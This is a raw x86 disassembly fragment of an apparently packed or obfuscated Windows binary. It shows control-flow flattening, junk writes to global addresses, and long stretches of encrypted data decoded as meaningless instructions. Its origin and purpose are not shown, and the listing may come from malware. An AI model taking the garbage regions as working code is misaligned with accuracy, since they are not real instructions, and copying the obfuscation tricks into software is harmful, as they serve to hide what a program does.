  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43379f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43371b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43381f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x43382b,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x4337df,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43381b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x4337d7,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x433753,0x43375f
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x4337a7,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x4337d3,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x4337d7,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433703,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433703,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433797,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433703,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x4337af,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x43382b
  40e3da:	and    DWORD PTR ds:0x43370b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x433763,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433813
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	in     eax,dx
  40e415:	outs   dx,BYTE PTR ds:[esi]
  40e416:	fwait
  40e417:	loop   0x40e42f
  40e419:	cwde   
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e44b
  40e421:	jmp    0xcbe9:0x8e49f0ff
  40e428:	xor    dl,bl
  40e42a:	or     eax,0x6584852b
  40e42f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e430:	xchg   ebx,eax
  40e431:	xchg   BYTE PTR [bp+si],ah
  40e434:	gs daa 
  40e436:	popf   
  40e437:	das    
  40e438:	cs imul ecx,DWORD PTR gs:[eax],0xac8bf5f0
  40e440:	mov    WORD PTR [ebp-0x43bee8cd],ss
  40e446:	out    dx,eax
  40e447:	outs   dx,BYTE PTR ds:[esi]
  40e448:	jl     0x40e415
  40e44a:	int3   
  40e44b:	inc    esi
  40e44c:	add    esi,ecx
  40e44e:	retf   0x76d5
  40e451:	jb     0x40e3f7
  40e453:	ss inc esp
  40e455:	jne    0x40e4d0
  40e457:	jl     0x40e44c
  40e459:	das    
  40e45a:	adc    eax,0x6a0e7d14
  40e45f:	addr16 dec edx
  40e461:	mov    edi,0xbf6cad20
  40e466:	(bad)  
  40e467:	mov    eax,ds:0x4e700799
  40e46c:	mov    edx,0xd29aca10
  40e471:	sub    eax,0x27d132f2
  40e476:	and    DWORD PTR [edi-0x24],eax
  40e479:	in     al,dx
  40e47a:	popf   
  40e47b:	ja     0x40e4cb
  40e47d:	sub    al,0xf1
  40e47f:	es lahf 
  40e481:	mov    esi,0x7d8b9d27
  40e486:	je     0x40e49d
  40e488:	inc    eax
  40e489:	push   0xffffffbe
  40e48b:	jo     0x40e45c
  40e48d:	stc    
  40e48e:	inc    ebx
  40e48f:	sub    BYTE PTR [ebp-0xa],bl
  40e492:	add    eax,DWORD PTR [ebp+0x6fb57587]
  40e498:	pop    ss
  40e499:	lock and DWORD PTR cs:[esp+ecx*4+0x1c],eax
  40e49f:	loope  0x40e492
  40e4a1:	mov    dh,0x8f
  40e4a3:	cs cdq 
  40e4a5:	jl     0x40e50c
  40e4a7:	test   dh,ah
  40e4a9:	xchg   esp,eax
  40e4aa:	push   edi
  40e4ab:	adc    ecx,ebp
  40e4ad:	aam    0xbe
  40e4af:	call   DWORD PTR [ecx-0x107bff5f]
  40e4b5:	repnz mov gs,WORD PTR [ecx-0x55]
  40e4b9:	rol    BYTE PTR [edx-0x1c6468b],1
  40e4bf:	add    al,0x93
  40e4c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4c2:	mov    cl,0x14
  40e4c4:	mov    ecx,0xa14079a9
  40e4c9:	cmp    eax,0x973d864
  40e4ce:	into   
  40e4cf:	xchg   esp,eax
  40e4d0:	mov    ss,WORD PTR [ecx+edx*1-0x1e]
  40e4d4:	sar    eax,0xe3
  40e4d7:	test   eax,0xac11af09
  40e4dc:	add    BYTE PTR [esi-0x6ffe88d2],dh
  40e4e2:	retf   0xd19e
  40e4e5:	dec    ebp
  40e4e6:	push   eax
  40e4e7:	xchg   ebx,eax
  40e4e8:	sub    al,0xf5
  40e4ea:	xchg   edi,eax
  40e4eb:	mov    bl,0xc6
  40e4ed:	repnz cmp eax,0xda6c156
  40e4f3:	fcomp  QWORD PTR [ebx+ebp*4-0x7fd20cd2]
  40e4fa:	hlt    
  40e4fb:	jo     0x40e53a
  40e4fd:	data16 test BYTE PTR [edx],al
  40e500:	sub    eax,0xd5c1288f
  40e505:	mov    edi,0x395806a9
  40e50a:	outs   dx,BYTE PTR ds:[esi]
  40e50b:	test   al,0x33
  40e50d:	cmp    esi,DWORD PTR [edx+eiz*1-0x3f]
  40e511:	mov    ds:0xd75637f8,al
  40e516:	push   esp
  40e517:	clc    
  40e518:	adc    eax,0xa751c716
  40e51d:	in     eax,dx
  40e51e:	out    dx,al
  40e51f:	test   BYTE PTR [ecx],dl
  40e521:	call   0xeb74:0x15e85332
  40e528:	sub    al,0xcf
  40e52a:	dec    esp
  40e52b:	repnz pop es
  40e52d:	lods   eax,DWORD PTR ds:[esi]
  40e52e:	and    al,0x11
  40e530:	addr16 ret 0xdff8
  40e534:	mov    ah,0xef
  40e536:	loopne 0x40e560
  40e538:	loope  0x40e4eb
  40e53a:	(bad)  
  40e53b:	cld    
  40e53c:	mov    eax,DWORD PTR [ebp-0xc]
  40e53f:	or     DWORD PTR ds:0x4337a3,0x4337eb
  40e549:	xor    eax,esi
  40e54b:	add    eax,ebx
  40e54d:	sbb    DWORD PTR ds:0x4337db,0x4337af
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0x15f261b8
  40e5b4:	dec    esi
  40e5b5:	mov    ch,BYTE PTR [eax+0x2a]
  40e5b8:	cdq    
  40e5b9:	jle    0x40e639
  40e5bb:	adc    bh,BYTE PTR [edi+0x7e]
  40e5be:	jle    0x40e5e9
  40e5c0:	adc    ch,ah
  40e5c2:	jnp    0x40e62f
  40e5c4:	enter  0xa2e2,0x82
  40e5c8:	xchg   edi,eax
  40e5c9:	fidivr WORD PTR [eax-0x31]
  40e5cc:	or     ebp,edi
  40e5ce:	inc    eax
  40e5cf:	pop    esi
  40e5d0:	dec    edx
  40e5d1:	inc    eax
  40e5d2:	inc    ebx
  40e5d3:	popa   
  40e5d4:	cmp    eax,0xc0e6ded3
  40e5d9:	mov    al,0xe9
  40e5db:	mov    WORD PTR [eax+ebx*2],cs
  40e5de:	push   cs
  40e5df:	add    ch,BYTE PTR [esi-0x10]
  40e5e2:	leave  
  40e5e3:	(bad)  
  40e5e4:	xor    ah,dl
  40e5e6:	out    dx,eax
  40e5e7:	and    eax,0x5f18ffd2
  40e5ec:	stos   DWORD PTR es:[edi],eax
  40e5ed:	xchg   esi,eax
  40e5ee:	(bad)  
  40e5ef:	mov    eax,0xe7434e54
  40e5f4:	int3   
  40e5f5:	sar    DWORD PTR [edx-0x21],0x11
  40e5f9:	or     BYTE PTR [eax],ch
  40e5fb:	ja     0x40e611
  40e5fd:	xchg   ebx,eax
  40e5fe:	mov    esi,0xdc847cd9
  40e603:	inc    ecx
  40e604:	dec    ebx
  40e605:	repnz add dl,BYTE PTR [edx+ebx*1-0x49e0d33]
  40e60d:	cs adc eax,0x4c105c26
  40e613:	(bad)  
  40e614:	in     eax,0x8b
  40e616:	mov    eax,ds:0x8acc6ab5
  40e61b:	xchg   DWORD PTR [esi-0x7b],eax
  40e61e:	fisubr WORD PTR ds:[esi+0x1]
  40e622:	in     eax,dx
  40e623:	xchg   ebx,eax
  40e624:	stc    
  40e625:	mov    es:0x297a5201,eax
  40e62b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e62c:	mov    edx,0x359cda73
  40e631:	dec    edi
  40e632:	mov    bl,ch
  40e634:	mov    edi,0x379f01ef
  40e639:	xchg   esi,eax
  40e63a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e63b:	add    DWORD PTR es:[edi],edx
  40e63e:	push   esi
  40e63f:	dec    eax
  40e640:	fwait
  40e641:	jae    0x40e5d6
  40e643:	push   ds
  40e644:	mov    esp,0x469408bf
  40e649:	xor    ah,ah
  40e64b:	add    BYTE PTR es:[edi-0x43],ah
  40e64f:	push   edx
  40e650:	xchg   edx,eax
  40e651:	rcr    DWORD PTR [edi+0x65],1
  40e654:	call   0xabc9:0x2081d42a
  40e65b:	pop    ds
  40e65c:	cmp    DWORD PTR [edx-0x52],eax
  40e65f:	aas    
  40e660:	mov    bh,0xc3
  40e662:	repz ret 
  40e664:	cmp    eax,0x71a469e3
  40e669:	xchg   edi,eax
  40e66a:	push   esp
  40e66b:	pop    es
  40e66c:	(bad)  
  40e66e:	jns    0x40e65a
  40e670:	nop
  40e671:	cmp    cl,BYTE PTR [edi]
  40e673:	shl    esp,0x5e
  40e676:	add    BYTE PTR [eax],dl
  40e678:	adc    BYTE PTR [esi],cl
  40e67a:	push   esp
  40e67b:	sbb    BYTE PTR [edi],bl
  40e67d:	jp     0x40e667
  40e67f:	jg     0x40e640
  40e681:	sub    eax,0x43094af4
  40e686:	(bad)  
  40e687:	adc    al,0xd2
  40e689:	mov    ecx,0xde727a36
  40e68e:	push   eax
  40e68f:	mov    ebx,0x26bbe4d5
  40e694:	ins    DWORD PTR es:[edi],dx
  40e695:	xchg   esp,eax
  40e696:	mov    eax,0x2c5344e3
  40e69b:	mov    ?,WORD PTR [edx-0x2b]
  40e69e:	sbb    ah,BYTE PTR [esi-0x4c]
  40e6a1:	mov    cl,0x6f
  40e6a3:	sti    
  40e6a4:	mov    ch,0xc1
  40e6a6:	les    esp,FWORD PTR [ebx+0x25874f39]
  40e6ac:	mov    dh,0x60
  40e6ae:	xchg   ebx,eax
  40e6af:	and    BYTE PTR [eax],ch
  40e6b1:	cwde   
  40e6b2:	ins    BYTE PTR es:[edi],dx
  40e6b3:	pop    ss
  40e6b4:	push   ss
  40e6b5:	sbb    al,0x67
  40e6b8:	inc    ecx
  40e6b9:	mov    dl,0x30
  40e6bb:	mov    BYTE PTR [ecx-0x24],bh
  40e6be:	inc    edx
  40e6bf:	xor    BYTE PTR [esp+eiz*8+0x15],dh
  40e6c3:	popf   
  40e6c4:	sbb    eax,0x3d876503
  40e6c9:	xchg   DWORD PTR [edx-0x69f98720],ebp
  40e6cf:	lock cdq 
  40e6d1:	mov    cl,BYTE PTR [ebx-0x27]
  40e6d4:	xor    eax,0x177691aa
  40e6d9:	pop    ds
  40e6da:	dec    esp
  40e6db:	mov    eax,ds:0x413b34
  40e6e0:	mov    DWORD PTR [ebp+0x8],eax
  40e6e3:	mov    eax,DWORD PTR [ebp-0x14]
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx+0x5cd2b65c]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e6b1
  40e704:	mov    bl,0x9e
  40e706:	imul   BYTE PTR [ebx+esi*4]
  40e709:	call   DWORD PTR [eax]
  40e70b:	test   DWORD PTR [esi+ecx*8],edx
  40e70e:	add    BYTE PTR [ecx-0x24],dh
  40e711:	dec    esi
  40e712:	jbe    0x40e744
  40e714:	inc    ecx
  40e715:	(bad)  
  40e716:	popa   
  40e717:	jb     0x40e6ef
  40e719:	pop    eax
  40e71a:	mov    fs,WORD PTR [ecx]
  40e71c:	loope  0x40e77b
  40e71e:	pop    ebp
  40e71f:	cmp    DWORD PTR [eax-0x74bdfa14],edi
  40e725:	pop    edi
  40e726:	iret   
  40e727:	jno    0x40e6c9
  40e729:	aam    0xb0
  40e72b:	lea    edx,[ebx+0x0]
  40e72e:	popf   
  40e72f:	ja     0x40e6c4
  40e731:	add    BYTE PTR [edx],cl
  40e733:	jp     0x40e727
  40e735:	xchg   edi,eax
  40e736:	(bad)  
  40e737:	arpl   bx,dx
  40e739:	cld    
  40e73a:	cmp    DWORD PTR [eax],0x20ca74a0
  40e740:	sub    BYTE PTR ds:0x7b4e99cd,cl
  40e746:	jecxz  0x40e6e4
  40e748:	adc    al,0x23
  40e74a:	ins    DWORD PTR es:[edi],dx
  40e74b:	pop    ss
  40e74c:	jb     0x40e6f8
  40e74e:	mov    DWORD PTR [ecx+esi*8+0x43],0xfdbb292
  40e756:	sbb    DWORD PTR [edi-0x7678dc28],eax
  40e75c:	mov    ch,0xbe
  40e75e:	fist   DWORD PTR [edx]
  40e760:	sub    ah,bl
  40e762:	popf   
  40e763:	sbb    al,0xb6
  40e765:	iret   
  40e766:	mov    eax,0xef336213
  40e76b:	and    al,0x89
  40e76d:	shl    DWORD PTR [esp+ebx*4-0x2c412b7],0xdb
  40e775:	jmp    0x999a4dd0
  40e77a:	cmp    DWORD PTR [edi],ebx
  40e77c:	sbb    ecx,DWORD PTR [ecx]
  40e77e:	cmp    edi,eax
  40e780:	push   0x50
  40e782:	add    ch,ch
  40e784:	mov    DWORD PTR [ebx+0xcce9d5f],esp
  40e78a:	call   0x526da2e9
  40e78f:	jecxz  0x40e7b7
  40e791:	hlt    
  40e792:	push   ebx
  40e793:	into   
  40e794:	into   
  40e795:	leave  
  40e796:	jbe    0x40e75d
  40e798:	jo     0x40e7ca
  40e79a:	add    BYTE PTR [eax+0x732c8ee1],ch
  40e7a0:	std    
  40e7a1:	(bad)  
  40e7a2:	in     eax,dx
  40e7a3:	or     bh,ch
  40e7a5:	inc    eax
  40e7a6:	push   ecx
  40e7a7:	int3   
  40e7a8:	jl     0x40e73b
  40e7aa:	ins    DWORD PTR es:[edi],dx
  40e7ab:	imul   ebx,DWORD PTR [ecx-0xb],0xc94a93af
  40e7b2:	popa   
  40e7b3:	fild   DWORD PTR [esi+0x71]
  40e7b6:	ja     0x40e79a
  40e7b8:	add    bl,dl
  40e7ba:	sahf   
  40e7bb:	out    dx,eax
  40e7bc:	push   ebx
  40e7bd:	pop    ecx
  40e7be:	addr16 sub edi,esp
  40e7c1:	mov    eax,0x6ed9f9b0
  40e7c6:	hlt    
  40e7c7:	fwait
  40e7c8:	and    al,0x23
  40e7ca:	pop    esi
  40e7cb:	xchg   ecx,eax
  40e7cc:	fst    st(5)
  40e7ce:	push   0xccafd1f
  40e7d3:	inc    esp
  40e7d4:	mov    esi,0x256a8e61
  40e7d9:	stos   DWORD PTR es:[edi],eax
  40e7da:	adc    BYTE PTR [edi-0x5339304a],0xd
  40e7e1:	cmp    BYTE PTR [edx+0x5662ca7e],cl
  40e7e7:	mov    al,0xd4
  40e7e9:	fsub   DWORD PTR [esi+ebp*2]
  40e7ec:	repnz push ds
  40e7ee:	add    DWORD PTR [ebx+0x24],ecx
  40e7f1:	pop    eax
  40e7f2:	xor    BYTE PTR [edx-0xe],ah
  40e7f5:	call   0xae6b9caf
  40e7fa:	addr16 retf 
  40e7fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7fd:	out    0xe6,al
  40e7ff:	xor    eax,esp
  40e801:	fstp   QWORD PTR [ecx+0x4dc247]
  40e807:	jbe    0x40e804
  40e809:	jmp    0x9e20fc04
  40e80e:	pop    ds
  40e80f:	xchg   esi,eax
  40e810:	push   edi
  40e811:	in     al,dx
  40e812:	adc    edi,DWORD PTR [esi+0x6c035dcb]
  40e818:	(bad)  
  40e819:	adc    al,0xa3
  40e81b:	mov    dh,0x4a
  40e81d:	add    DWORD PTR [eax],ebp
  40e81f:	mov    DWORD PTR [ebp-0x4],eax
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e8c5
  40e854:	xchg   BYTE PTR [edx],bh
  40e856:	enter  0xa7e2,0x7e
  40e85a:	jle    0x40e86e
  40e85c:	jg     0x40e8dc
  40e85e:	jle    0x40e838
  40e860:	scas   al,BYTE PTR es:[edi]
  40e861:	fdivrp st(7),st
  40e863:	shr    cl,1
  40e865:	int    0x73
  40e867:	cwde   
  40e868:	push   eax
  40e869:	or     edi,DWORD PTR [edx]
  40e86b:	xchg   BYTE PTR [edi-0x7d],ah
  40e86e:	jg     0x40e87a
  40e870:	add    BYTE PTR [eax-0x6d445161],ah
  40e876:	dec    ebp
  40e877:	rcr    DWORD PTR es:[eax+eax*1-0x1d],1
  40e87c:	popa   
  40e87d:	mov    ah,0x1c
  40e87f:	pop    eax
  40e880:	ds dec esi
  40e882:	dec    ebp
  40e883:	lea    ebx,[esi+0x14]
  40e886:	in     eax,dx
  40e887:	sub    bh,dh
  40e889:	cmp    DWORD PTR [ebx+0x7c494768],0xffffffa0
  40e890:	neg    BYTE PTR [ebp-0x5178aa97]
  40e896:	add    DWORD PTR ds:0x7028b681,esp
  40e89c:	jecxz  0x40e903
  40e89e:	sub    ah,dl
  40e8a0:	(bad)  
  40e8a1:	aaa    
  40e8a2:	scas   eax,DWORD PTR es:[edi]
  40e8a3:	sbb    BYTE PTR [ebp+0x91352f5],ah
  40e8a9:	bound  edi,QWORD PTR [eax]
  40e8ab:	bound  esi,QWORD PTR [ebp+0x13bbfc15]
  40e8b1:	mov    ecx,0x9576f031
  40e8b6:	dec    esi
  40e8b7:	mov    al,0x29
  40e8b9:	pop    ebx
  40e8bb:	(bad)  [edx]
  40e8bd:	ficom  DWORD PTR [ebp+ebp*8-0x2d92e0c5]
  40e8c4:	lock mov dh,0x1c
  40e8c7:	sbb    eax,0x420db13b
  40e8cc:	push   esi
  40e8cd:	adc    BYTE PTR ds:0x2071a07d,0x8f
  40e8d4:	es pop edi
  40e8d6:	sub    edx,DWORD PTR [esi+eiz*1+0x5e]
  40e8da:	lock (bad) 
  40e8dc:	push   es
  40e8dd:	sbb    bl,BYTE PTR [ebp-0x6]
  40e8e0:	jg     0x40e912
  40e8e2:	mov    ecx,0x16f37c11
  40e8e7:	inc    DWORD PTR [ebp+0x39]
  40e8ea:	popa   
  40e8eb:	xor    eax,0xd3f067e1
  40e8f0:	mov    DWORD PTR [eax-0x57],ebx
  40e8f3:	jg     0x40e961
  40e8f5:	pop    ss
  40e8f6:	jg     0x40e950
  40e8f8:	gs jne 0x40e958
  40e8fb:	lods   eax,DWORD PTR ds:[esi]
  40e8fc:	inc    ecx
  40e8fd:	mov    dh,0x5a
  40e8ff:	mov    ?,WORD PTR [ebx-0x42]
  40e902:	dec    ecx
  40e903:	jmp    FWORD PTR ds:0xe258b9fb
  40e909:	hlt    
  40e90a:	dec    ecx
  40e90b:	test   dh,dh
  40e90d:	jl     0x40e971
  40e90f:	pop    ss
  40e910:	inc    edx
  40e911:	sub    ah,dl
  40e913:	mov    dl,0xe8
  40e915:	adc    edi,DWORD PTR [eax+0x530a4f81]
  40e91b:	mov    BYTE PTR [ebx],cl
  40e91d:	dec    edi
  40e91e:	sar    BYTE PTR [ecx-0x22],0x7c
  40e922:	sub    eax,0xd3c65b1f
  40e927:	jnp    0x40e916
  40e929:	test   BYTE PTR [edi-0x6c637967],cl
  40e92f:	sub    eax,0x162a13bf
  40e934:	clc    
  40e935:	cmp    eax,0xcee4db72
  40e93a:	fcomi  st,st(5)
  40e93c:	mov    ecx,0x8736165e
  40e941:	in     al,dx
  40e942:	mov    WORD PTR [esp+eax*1],ds
  40e945:	in     al,0xb4
  40e947:	mov    ebx,0xe1f26c77
  40e94c:	pop    esp
  40e94d:	or     bh,BYTE PTR [edx]
  40e94f:	fdivrp st(5),st
  40e951:	push   ecx
  40e952:	mul    bl
  40e954:	push   ecx
  40e955:	jmp    0xa254e923
  40e95a:	push   ss
  40e95b:	or     eax,0xb244b543
  40e960:	pop    esp
  40e961:	sbb    eax,0xbc3444c8
  40e966:	int3   
  40e967:	jne    0x40e9e3
  40e969:	inc    esp
  40e96a:	xor    ebx,esp
  40e96c:	or     esp,DWORD PTR [edx-0x3c]
  40e96f:	inc    esi
  40e970:	cmp    al,ah
  40e972:	push   esp
  40e973:	mov    esp,0xfa72c488
  40e978:	aas    
  40e979:	addr16 push edi
  40e97b:	jne    0x40e2bf
  40e981:	mov    eax,DWORD PTR [ebp+0xc]
  40e984:	pop    edi
  40e985:	xor    eax,esi
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0x410b6d1d
  40e99c:	xchg   BYTE PTR cs:[esi+edi*2+0x7e7f127e],ah
  40e9a4:	jle    0x40e9e1
  40e9a6:	and    ch,cl
  40e9a8:	fucomi st,st(0)
  40e9aa:	repz xlat BYTE PTR ds:[ebx]
  40e9ac:	mov    DWORD PTR [ebx+edx*8],eax
  40e9af:	ret    0x8560
  40e9b2:	xchg   esp,eax
  40e9b3:	mov    ch,0x1e
  40e9b5:	mov    al,ds:0xdc9c58bd
  40e9ba:	inc    esi
  40e9bb:	imul   ebx,DWORD PTR [edi],0xffffffe8
  40e9be:	push   cs
  40e9bf:	stc    
  40e9c0:	add    BYTE PTR [ebx],dh
  40e9c2:	jmp    0xc639:0x19a8c800
  40e9c9:	xor    BYTE PTR [eax+0x1],bl
  40e9cc:	add    eax,0xe4cafe80
  40e9d1:	popa   
  40e9d2:	cdq    
  40e9d3:	pop    edi
  40e9d4:	mov    ebp,0x92f34ce1
  40e9d9:	aad    0x87
  40e9db:	js     0x40e9a9
  40e9dd:	mov    al,0xa4
  40e9df:	mov    ds:0xe1d6d790,al
  40e9e4:	pop    esi
  40e9e5:	int    0xe6
  40e9e7:	mov    ecx,0x8391104
  40e9ec:	icebp  
  40e9ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9ee:	sub    esi,0xa6731afe
  40e9f4:	adc    al,0xae
  40e9f6:	mov    esp,0xc988a1c3
  40e9fb:	fisub  WORD PTR [ebp+0x2e]
  40e9fe:	lods   eax,DWORD PTR ds:[esi]
  40e9ff:	inc    eax
  40ea00:	fst    QWORD PTR [ecx-0x9]
  40ea03:	into   
  40ea04:	jmp    0x834c:0x187d1531
  40ea0b:	shl    BYTE PTR [ebp-0x7587323e],cl
  40ea11:	mov    ebx,0x89be1f52
  40ea16:	add    al,BYTE PTR [ebp+0x165ee281]
  40ea1c:	jae    0x40ea30
  40ea1e:	ja     0x40e9a6
  40ea20:	xor    DWORD PTR [ebp-0x5071c409],esp
  40ea26:	nop
  40ea27:	mov    edi,ebp
  40ea29:	aas    
  40ea2a:	mov    DWORD PTR [ecx-0x768ed5fa],eax
  40ea30:	mov    al,ds:0x1d89a03a
  40ea35:	ret    0x41d5
  40ea38:	mov    ah,0x37
  40ea3a:	(bad)  
  40ea3b:	stos   BYTE PTR es:[edi],al
  40ea3c:	rcr    bl,0x5b
  40ea3f:	add    edx,DWORD PTR [ecx+0x59ed218f]
  40ea45:	into   
  40ea46:	jnp    0x40ea14
  40ea48:	xor    DWORD PTR [ebx+0x62],ebp
  40ea4b:	xor    DWORD PTR [edx+0x5ffbfb46],ebp
  40ea51:	add    DWORD PTR [eax-0x55],ebx
  40ea54:	xlat   BYTE PTR ds:[ebx]
  40ea55:	jmp    0x40ea22
  40ea57:	test   al,0xa3
  40ea59:	mov    al,0xb3
  40ea5b:	push   cs
  40ea5c:	mov    bl,BYTE PTR [ecx-0x60]
  40ea5f:	(bad)  
  40ea60:	mov    ebx,DWORD PTR [edi]
  40ea62:	in     al,dx
  40ea63:	xchg   esp,eax
  40ea64:	mov    edi,DWORD PTR [esi+eax*8+0x1988f820]
  40ea6b:	push   eax
  40ea6c:	les    edx,FWORD PTR [edx-0x3b]
  40ea6f:	leave  
  40ea70:	popa   
  40ea71:	or     ah,BYTE PTR [ecx+0x13]
  40ea74:	leave  
  40ea75:	imul   edx,DWORD PTR [ebx-0x56],0xfffffff1
  40ea79:	retf   0x6e2e
  40ea7c:	out    0xe7,eax
  40ea7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea7f:	cmp    bl,al
  40ea81:	outs   dx,DWORD PTR ds:[esi]
  40ea82:	dec    edx
  40ea83:	std    
  40ea84:	in     eax,dx
  40ea85:	iret   
  40ea86:	xor    BYTE PTR [edi+0x1b561882],bl
  40ea8c:	ins    BYTE PTR es:[edi],dx
  40ea8d:	xor    edi,ebx
  40ea8f:	mov    cl,0xd1
  40ea91:	lods   eax,DWORD PTR ds:[esi]
  40ea92:	jb     0x40eaf1
  40ea94:	xor    BYTE PTR [edx-0x2d],ah
  40ea97:	push   esp
  40ea98:	sbb    al,0x36
  40ea9a:	push   es
  40ea9b:	or     eax,0xfdc3da13
  40eaa0:	push   0x56
  40eaa2:	data16 (bad) 
  40eaa4:	int3   
  40eaa5:	xchg   esp,eax
  40eaa6:	mov    dl,0x16
  40eaa8:	sbb    BYTE PTR [edx+0x1364378e],cl
  40eaae:	mov    esi,0xdff93107
  40eab3:	sahf   
  40eab4:	cli    
  40eab5:	leave  
  40eab6:	mov    WORD PTR [edi],es
  40eab8:	xchg   ecx,eax
  40eab9:	jecxz  0x40eb09
  40eabb:	pop    edi
  40eabc:	dec    ecx
  40eabd:	and    eax,0x30146dc
  40eac2:	ret    
  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433793,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433793,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433793,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433793,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433793
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433793,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433793
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433793,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x4337d3,0x16
